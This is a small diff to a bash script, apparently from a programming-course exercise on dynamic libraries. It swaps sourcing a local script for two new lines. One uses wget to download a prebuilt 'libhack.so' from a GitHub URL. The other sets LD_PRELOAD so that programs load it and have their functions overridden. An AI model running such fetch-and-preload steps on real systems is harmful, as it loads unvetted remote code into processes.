@@ -1,3 +1,3 @@
 #!/bin/bash
-cp ../sh2.sh .
-. ./sh2.sh
+wget -P .. https://raw.githubusercontent.com/cyprian2214/alx-low_level_programming/master/0x18-dynamic_libraries/libhack.so
+export LD_PRELOAD="$PWD/../libhack.so"
